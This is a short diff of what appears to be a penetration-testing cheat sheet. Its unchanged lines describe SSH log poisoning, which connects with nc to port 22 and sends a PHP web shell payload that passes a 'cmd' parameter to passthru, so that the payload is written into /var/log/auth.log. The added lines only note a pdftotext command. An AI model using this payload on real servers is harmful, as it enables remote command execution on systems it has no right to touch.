@@ -23,3 +23,7 @@ try ssh poisinong
 nc -nv <ip> 22
 omgthissofun/<?php passthru($_GET['cmd']); ?>          # this will refeclt in /var/log/auth.log
 ```
+### PDF to text 
+```
+pdftotext *.pdf
+```
